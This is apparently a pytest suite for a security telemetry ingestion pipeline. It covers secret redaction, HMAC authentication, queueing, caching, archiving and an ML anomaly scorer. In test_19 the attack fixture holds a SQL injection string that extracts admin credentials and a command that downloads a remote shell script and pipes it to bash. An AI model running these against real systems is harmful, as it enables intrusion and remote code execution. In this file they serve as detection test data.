"""
Shield Technology - Pipeline & Architecture Comprehensive Test Suite
Weeks 12-14: Validates Parsing, Sanitization, Ingestion, Message Queuing,
DLQ routing, Rate Limiting, Cursor Pagination, Caching, Archiver, and Metrics.
Target Coverage: >85%.
"""

import asyncio
import json
import os
import tempfile
from datetime import datetime, timezone, timedelta
import pytest
import httpx

from app.broker import message_broker, MemoryMessageBroker
from app.cache import cache_service
from app.database import async_session_factory, init_db
from app.main import app
from app.parser import LogParser, MalformedLogException
from app.rate_limiter import SlidingWindowRateLimiter
from app.repository import TelemetryRepository
from app.schemas import RawTelemetryEvent, SeverityEnum, EventTypeEnum
from app.security import compute_hmac_signature, API_KEY, HMAC_SECRET
from app.worker import TelemetryWorker
from app.archiver import LogArchiver


@pytest.fixture(autouse=True)
async def setup_test_environment():
    """Initializes schema and resets memory brokers before each test."""
    await init_db()
    message_broker.queues.clear()
    message_broker.dlq.clear()
    await cache_service.invalidate("stats:")
    yield


@pytest.mark.asyncio
async def test_01_schema_validation_and_sensitive_data_redaction():
    """Validates that passwords, tokens, and secrets are automatically redacted."""
    raw_event = RawTelemetryEvent(
        timestamp=datetime.now(timezone.utc),
        agent_id="probe-sousse-01",
        severity=SeverityEnum.CRITICAL,
        event_type=EventTypeEnum.SQL_INJECTION_ATTEMPT,
        source_ip="197.14.88.22",
        destination_ip="10.0.0.5",
        payload={
            "username": "admin",
            "password": "ClearTextPassword123!",
            "api_key": "secret_token_abc_xyz",
            "access_token": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.t-IDNbu3rqL0xWNWymPNph6JwUKoWjyAfFD0Mgcvda0",
            "query": "SELECT * FROM users WHERE id = 1",
            "nested": {
                "secret_key": "SuperSecretVal!",
                "safe_field": "HarmlessValue",
            }
        }
    )

    sanitized = LogParser.parse_and_sanitize(raw_event)

    # Assertions
    assert sanitized.event_hash is not None
    assert len(sanitized.event_hash) == 64
    assert sanitized.sanitized_payload["password"] == "***REDACTED***"
    assert sanitized.sanitized_payload["api_key"] == "***REDACTED***"
    assert sanitized.sanitized_payload["access_token"] == "***REDACTED***"
    assert sanitized.sanitized_payload["nested"]["secret_key"] == "***REDACTED***"
    assert sanitized.sanitized_payload["nested"]["safe_field"] == "HarmlessValue"
    assert sanitized.enrichment["geo_country"] == "TN"
    assert sanitized.enrichment["network_class"] == "EXTERNAL_WAN"


@pytest.mark.asyncio
async def test_02_ip_enrichment_private_vs_public():
    """Verifies IP classification for local subnets and public addresses."""
    res_private = LogParser.enrich_ip("192.168.1.50")
    assert res_private["is_private"] is True
    assert res_private["network_class"] == "INTERNAL_DEFENSE_SUBNET"

    res_public = LogParser.enrich_ip("45.33.32.156")
    assert res_public["is_private"] is False
    assert res_public["network_class"] == "EXTERNAL_WAN"


@pytest.mark.asyncio
async def test_03_deduplication_hash_determinism():
    """Verifies that identical events produce identical SHA-256 hashes."""
    ts = datetime(2026, 6, 15, 12, 0, 0, tzinfo=timezone.utc)
    raw1 = RawTelemetryEvent(
        timestamp=ts,
        agent_id="probe-tunis-01",
        severity=SeverityEnum.HIGH,
        event_type=EventTypeEnum.AUTH_ATTEMPT,
        source_ip="197.14.88.22",
        payload={"attempt": 1}
    )
    raw2 = RawTelemetryEvent(
        timestamp=ts,
        agent_id="probe-tunis-01",
        severity=SeverityEnum.HIGH,
        event_type=EventTypeEnum.AUTH_ATTEMPT,
        source_ip="197.14.88.22",
        payload={"attempt": 1}
    )

    s1 = LogParser.parse_and_sanitize(raw1)
    s2 = LogParser.parse_and_sanitize(raw2)
    assert s1.event_hash == s2.event_hash


@pytest.mark.asyncio
async def test_04_security_hmac_and_api_key_authentication():
    """Verifies probe security with valid signature, tampered body rejection, and invalid API key."""
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://testserver") as client:
        payload = {
            "events": [
                {
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "agent_id": "probe-tunis-01",
                    "severity": "MEDIUM",
                    "event_type": "PORT_SCAN",
                    "source_ip": "197.14.88.22",
                    "payload": {"ports": [80, 443]}
                }
            ]
        }
        body = json.dumps(payload).encode("utf-8")
        valid_sig = compute_hmac_signature(body, HMAC_SECRET)

        # 1. Valid authentication -> 202 Accepted
        res_ok = await client.post(
            "/api/v1/telemetry/ingest",
            content=body,
            headers={
                "Content-Type": "application/json",
                "X-API-Key": API_KEY,
                "X-HMAC-Signature": valid_sig,
            }
        )
        assert res_ok.status_code == 202
        data = res_ok.json()
        assert data["accepted_count"] == 1
        assert data["status"] == "accepted"

        # 2. Tampered signature -> 403 Forbidden
        res_tampered = await client.post(
            "/api/v1/telemetry/ingest",
            content=body,
            headers={
                "Content-Type": "application/json",
                "X-API-Key": API_KEY,
                "X-HMAC-Signature": "invalid_tampered_hmac_signature_0000",
            }
        )
        assert res_tampered.status_code == 403

        # 3. Missing or wrong API key -> 401 Unauthorized
        res_bad_key = await client.post(
            "/api/v1/telemetry/ingest",
            content=body,
            headers={
                "Content-Type": "application/json",
                "X-API-Key": "wrong_key",
                "X-HMAC-Signature": valid_sig,
            }
        )
        assert res_bad_key.status_code == 401


@pytest.mark.asyncio
async def test_05_worker_batching_and_dead_letter_queue():
    """Verifies that the async worker processes valid logs and redirects poison logs to the DLQ."""
    worker = TelemetryWorker(broker=message_broker, queue_name="telemetry.test", batch_size=10)

    valid_item = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "agent_id": "probe-valid-01",
        "severity": "LOW",
        "event_type": "SYSTEM_HEARTBEAT",
        "source_ip": "10.0.0.1",
        "payload": {"uptime": 3600}
    }
    poison_item = {
        "timestamp": "invalid_date_format",
        "agent_id": "",  # Blank agent_id violates validation
        "severity": "UNKNOWN_SEV",
        "event_type": "NOT_A_VALID_TYPE",
        "source_ip": "",
    }

    await message_broker.publish("telemetry.test", valid_item)
    await message_broker.publish("telemetry.test", poison_item)

    inserted, dlq = await worker.run_once(timeout_sec=0.1)

    assert inserted == 1
    assert dlq == 1
    assert await message_broker.get_dlq_depth() == 1
    dlq_records = message_broker.dlq
    assert "error_reason" in dlq_records[0]


@pytest.mark.asyncio
async def test_06_database_bulk_upsert_and_conflict_handling():
    """Verifies bulk upsert behavior when identical event hashes are inserted."""
    ts = datetime.now(timezone.utc)
    ev1 = RawTelemetryEvent(
        timestamp=ts,
        agent_id="probe-upsert-01",
        severity=SeverityEnum.MEDIUM,
        event_type=EventTypeEnum.FIREWALL_DROP,
        source_ip="197.14.88.22",
        payload={"counter": 1}
    )
    s1 = LogParser.parse_and_sanitize(ev1)

    async with async_session_factory() as session:
        repo = TelemetryRepository(session)
        # First insertion
        res1 = await repo.bulk_insert([s1])
        assert res1 == 1

        # Second insertion with same hash but updated payload (Upsert)
        ev2 = RawTelemetryEvent(
            timestamp=ts,
            agent_id="probe-upsert-01",
            severity=SeverityEnum.MEDIUM,
            event_type=EventTypeEnum.FIREWALL_DROP,
            source_ip="197.14.88.22",
            payload={"counter": 2, "updated": True}
        )
        s2 = LogParser.parse_and_sanitize(ev2)
        res2 = await repo.bulk_insert([s2])
        assert res2 == 1


@pytest.mark.asyncio
async def test_07_cursor_pagination():
    """Verifies cursor-based pagination ordering and boundary consistency."""
    now = datetime.now(timezone.utc)
    events = []
    for i in range(15):
        raw = RawTelemetryEvent(
            timestamp=now - timedelta(seconds=i * 10),
            agent_id="probe-cursor-test",
            severity=SeverityEnum.LOW,
            event_type=EventTypeEnum.SYSTEM_HEARTBEAT,
            source_ip=f"10.0.0.{i+1}",
            payload={"index": i}
        )
        events.append(LogParser.parse_and_sanitize(raw))

    async with async_session_factory() as session:
        repo = TelemetryRepository(session)
        await repo.bulk_insert(events)

        # Page 1: limit 5
        items_p1, cursor_1, has_more_1 = await repo.get_history(limit=5, agent_id="probe-cursor-test")
        assert len(items_p1) == 5
        assert has_more_1 is True
        assert cursor_1 is not None

        # Page 2: with cursor
        items_p2, cursor_2, has_more_2 = await repo.get_history(cursor=cursor_1, limit=5, agent_id="probe-cursor-test")
        assert len(items_p2) == 5
        assert items_p1[-1].timestamp > items_p2[0].timestamp


@pytest.mark.asyncio
async def test_08_redis_cache_invalidation_for_stats():
    """Verifies stats aggregation and Redis cache hit/miss behavior."""
    now = datetime.now(timezone.utc)
    events = [
        LogParser.parse_and_sanitize(
            RawTelemetryEvent(
                timestamp=now,
                agent_id="probe-stats-test",
                severity=SeverityEnum.CRITICAL,
                event_type=EventTypeEnum.MALWARE_DETECTED,
                source_ip="185.220.101.4",
                payload={"threat": "trojan"}
            )
        )
    ]
    async with async_session_factory() as session:
        repo = TelemetryRepository(session)
        await repo.bulk_insert(events)

    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://testserver") as client:
        # First query: Cache Miss
        r1 = await client.get("/api/v1/telemetry/stats?window_hours=24")
        assert r1.status_code == 200
        d1 = r1.json()
        assert d1["cache_hit"] is False
        assert d1["total_events"] >= 1

        # Second query: Cache Hit
        r2 = await client.get("/api/v1/telemetry/stats?window_hours=24")
        assert r2.status_code == 200
        d2 = r2.json()
        assert d2["cache_hit"] is True


@pytest.mark.asyncio
async def test_09_sliding_window_rate_limiter():
    """Verifies that exceeding the agent rate limit triggers a 429 response."""
    limiter = SlidingWindowRateLimiter(max_requests=3, window_seconds=10)
    agent = "probe-spammer-99"

    assert limiter.is_allowed(agent) is True
    assert limiter.is_allowed(agent) is True
    assert limiter.is_allowed(agent) is True
    # 4th request within 10s should be blocked
    assert limiter.is_allowed(agent) is False


@pytest.mark.asyncio
async def test_10_log_archiver_and_sha256_checksum():
    """Verifies archiving of historical records and cryptographic SHA-256 integrity verification."""
    old_ts = datetime.now(timezone.utc) - timedelta(days=60)
    raw = RawTelemetryEvent(
        timestamp=old_ts,
        agent_id="probe-archive-test",
        severity=SeverityEnum.LOW,
        event_type=EventTypeEnum.SYSTEM_HEARTBEAT,
        source_ip="10.0.0.99",
        payload={"archived_data": True}
    )
    s = LogParser.parse_and_sanitize(raw)

    async with async_session_factory() as session:
        repo = TelemetryRepository(session)
        await repo.bulk_insert([s])

        with tempfile.TemporaryDirectory() as tmp_dir:
            archiver = LogArchiver(archive_dir=tmp_dir)
            cutoff = datetime.now(timezone.utc) - timedelta(days=30)
            res = await archiver.archive_events(session=session, cutoff_date=cutoff, compress=True)

            assert res["status"] == "success"
            assert res["events_archived"] >= 1
            assert len(res["sha256_checksum"]) == 64
            assert os.path.exists(res["archive_path"])


@pytest.mark.asyncio
async def test_11_health_and_prometheus_metrics_endpoints():
    """Verifies /api/v1/health and /metrics exposition."""
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://testserver") as client:
        health_res = await client.get("/api/v1/health")
        assert health_res.status_code == 200
        h_data = health_res.json()
        assert h_data["status"] == "healthy"
        assert "queue_depth" in h_data

        metrics_res = await client.get("/metrics")
        assert metrics_res.status_code == 200
        m_text = metrics_res.text
        assert "telemetry_events_ingested_total" in m_text
        assert "telemetry_queue_depth" in m_text


@pytest.mark.asyncio
async def test_12_history_api_with_filters_and_pagination():
    """Verifies GET /api/v1/telemetry/history with HTTP client and query parameters."""
    now = datetime.now(timezone.utc)
    ev = RawTelemetryEvent(
        timestamp=now,
        agent_id="probe-http-history",
        severity=SeverityEnum.CRITICAL,
        event_type=EventTypeEnum.MALWARE_DETECTED,
        source_ip="197.14.88.99",
        payload={"threat": "ransomware"}
    )
    s = LogParser.parse_and_sanitize(ev)

    async with async_session_factory() as session:
        repo = TelemetryRepository(session)
        await repo.bulk_insert([s])

    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://testserver") as client:
        res = await client.get(
            "/api/v1/telemetry/history",
            params={
                "agent_id": "probe-http-history",
                "severity": "CRITICAL",
                "event_type": "MALWARE_DETECTED",
                "limit": 10
            }
        )
        assert res.status_code == 200
        data = res.json()
        assert data["total_returned"] >= 1
        assert data["items"][0]["agent_id"] == "probe-http-history"
        assert data["items"][0]["severity"] == "CRITICAL"


@pytest.mark.asyncio
async def test_13_dlq_inspection_and_archive_endpoints():
    """Verifies DLQ inspection and manual archiving triggering via HTTP endpoints."""
    # Push a poison item to DLQ
    await message_broker.publish_dlq({"corrupt": "data"}, error_reason="SchemaValidationError")

    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://testserver") as client:
        # Check DLQ endpoint
        res_dlq = await client.get("/api/v1/telemetry/dlq")
        assert res_dlq.status_code == 200
        d_data = res_dlq.json()
        assert d_data["dlq_depth"] >= 1
        assert len(d_data["records"]) >= 1

        # Check Archive endpoint
        res_archive = await client.post("/api/v1/telemetry/archive?days_back=1")
        assert res_archive.status_code == 200
        a_data = res_archive.json()
        assert a_data["status"] in ["success", "noop"]


@pytest.mark.asyncio
async def test_14_worker_background_lifecycle():
    """Verifies background worker starting, message ingestion, and clean stopping."""
    worker = TelemetryWorker(broker=message_broker, queue_name="telemetry.lifecycle", batch_size=5)

    valid_event = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "agent_id": "probe-lifecycle-01",
        "severity": "LOW",
        "event_type": "SYSTEM_HEARTBEAT",
        "source_ip": "10.0.0.1",
        "payload": {"ping": "pong"}
    }
    await message_broker.publish("telemetry.lifecycle", valid_event)
    inserted, _ = await worker.run_once(timeout_sec=0.1)
    assert inserted >= 1

    # Verify background loop start / stop cycle
    worker_task = asyncio.create_task(worker.start())
    await asyncio.sleep(0.05)
    worker.stop()
    worker_task.cancel()
    try:
        await worker_task
    except asyncio.CancelledError:
        pass

    assert worker._running is False


@pytest.mark.asyncio
async def test_15_single_insert_and_repo_filtering():
    """Verifies single_insert, repo filters (date ranges, event_type, severity)."""
    now = datetime.now(timezone.utc)
    agent = f"probe-single-{int(now.timestamp())}"
    ev = RawTelemetryEvent(
        timestamp=now,
        agent_id=agent,
        severity=SeverityEnum.HIGH,
        event_type=EventTypeEnum.DDOS_FLOOD,
        source_ip="185.220.101.5",
        payload={"syn_rate": 10000}
    )
    s = LogParser.parse_and_sanitize(ev)

    async with async_session_factory() as session:
        repo = TelemetryRepository(session)
        inserted = await repo.single_insert(s)
        assert inserted is not None
        assert inserted.agent_id == agent

        # Query with start and end time filters
        start = now - timedelta(minutes=5)
        end = now + timedelta(minutes=5)
        items, _, _ = await repo.get_history(
            agent_id=agent,
            severity="HIGH",
            event_type="DDOS_FLOOD",
            start_time=start,
            end_time=end,
        )
        assert len(items) == 1
        assert items[0].agent_id == agent


@pytest.mark.asyncio
async def test_16_broker_threshold_alert():
    """Verifies webhook alert trigger when broker queue exceeds critical threshold."""
    alert_messages = []

    async def mock_webhook(msg):
        alert_messages.append(msg)

    small_broker = MemoryMessageBroker(critical_threshold=3, webhook_alert_callback=mock_webhook)
    for i in range(4):
        await small_broker.publish("test_q", {"idx": i})

    await asyncio.sleep(0.05)
    assert len(alert_messages) >= 1
    assert "critical depth" in alert_messages[0]


@pytest.mark.asyncio
async def test_17_cache_service_fallback_and_expiry():
    """Verifies in-memory fallback cache set, get, expiry, and invalidation."""
    # Set with short TTL
    await cache_service.set("test_key", {"foo": "bar"}, ttl_seconds=1)
    cached = await cache_service.get("test_key")
    assert cached == {"foo": "bar"}

    # Invalidate by prefix
    deleted = await cache_service.invalidate("test_")
    assert deleted >= 1
    assert await cache_service.get("test_key") is None


@pytest.mark.asyncio
async def test_18_archiver_uncompressed():
    """Verifies archiving historical events without gzip compression."""
    old_ts = datetime.now(timezone.utc) - timedelta(days=90)
    raw = RawTelemetryEvent(
        timestamp=old_ts,
        agent_id="probe-uncompressed",
        severity=SeverityEnum.LOW,
        event_type=EventTypeEnum.SYSTEM_HEARTBEAT,
        source_ip="10.10.10.10",
        payload={"uncompressed": True}
    )
    s = LogParser.parse_and_sanitize(raw)

    async with async_session_factory() as session:
        repo = TelemetryRepository(session)
        await repo.bulk_insert([s])

        with tempfile.TemporaryDirectory() as tmp_dir:
            archiver = LogArchiver(archive_dir=tmp_dir)
            cutoff = datetime.now(timezone.utc) - timedelta(days=30)
            res = await archiver.archive_events(session=session, cutoff_date=cutoff, compress=False)

            assert res["status"] == "success"
            assert res["events_archived"] >= 1
            assert res["archive_path"].endswith(".jsonl")
            assert os.path.exists(res["archive_path"])


@pytest.mark.asyncio
async def test_19_ml_anomaly_scorer_and_auto_escalation(tmp_path):
    """Verifies Shannon entropy calculation, Isolation Forest scoring, and autonomous CRITICAL escalation."""
    from app.ml_scorer import calculate_shannon_entropy, ml_anomaly_scorer

    # 1. Shannon entropy check
    ent_low = calculate_shannon_entropy("aaaaaa")
    ent_high = calculate_shannon_entropy("SELECT * FROM users WHERE password='!@#$%' UNION SELECT")
    assert ent_low == 0.0
    assert ent_high > 3.5

    # 2. Benign event -> score < 0.80, no escalation
    benign_raw = RawTelemetryEvent(
        timestamp=datetime.now(timezone.utc),
        agent_id="probe-benign-01",
        severity=SeverityEnum.LOW,
        event_type=EventTypeEnum.SYSTEM_HEARTBEAT,
        source_ip="10.0.0.1",
        payload={"uptime": 12000, "status": "ok"}
    )
    benign_sanitized = LogParser.parse_and_sanitize(benign_raw)
    score_benign, is_anom_benign = ml_anomaly_scorer.score_event(benign_sanitized)
    assert score_benign < 0.80
    assert is_anom_benign is False
    assert benign_sanitized.severity == SeverityEnum.LOW

    # 3. Critical Attack event with high entropy and suspicious keywords -> score > 0.80, auto-escalation to CRITICAL
    attack_raw = RawTelemetryEvent(
        timestamp=datetime.now(timezone.utc),
        agent_id="probe-attack-01",
        severity=SeverityEnum.MEDIUM,  # Starts at MEDIUM
        event_type=EventTypeEnum.SQL_INJECTION_ATTEMPT,
        source_ip="185.220.101.4",  # EXTERNAL_WAN
        payload={
            "query": "1' UNION SELECT username, password, token, secret FROM admin_credentials WHERE 1=1 --",
            "cmd": "curl -s http://185.220.101.5/malware.sh | /bin/bash",
            "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.t-IDNbu3rqL0xWNWymPNph6JwUKoWjyAfFD0Mgcvda0"
        }
    )
    attack_sanitized = LogParser.parse_and_sanitize(attack_raw)
    score_attack, is_anom_attack = ml_anomaly_scorer.score_event(attack_sanitized)
    assert score_attack > 0.80
    assert is_anom_attack is True
    assert attack_sanitized.severity == SeverityEnum.CRITICAL  # Auto-escalated to CRITICAL!
    assert attack_sanitized.enrichment.get("auto_escalated") is True

    # 4. Model Evaluation metrics
    eval_metrics = ml_anomaly_scorer.evaluate_model(n_samples=300)
    assert eval_metrics["f1_score"] >= 90.0
    assert eval_metrics["precision"] >= 90.0

    # 5. Visualizations generation
    plots = ml_anomaly_scorer.generate_report_visualizations(tmp_path)
    assert len(plots) == 3
    for p in plots:
        assert os.path.exists(p)


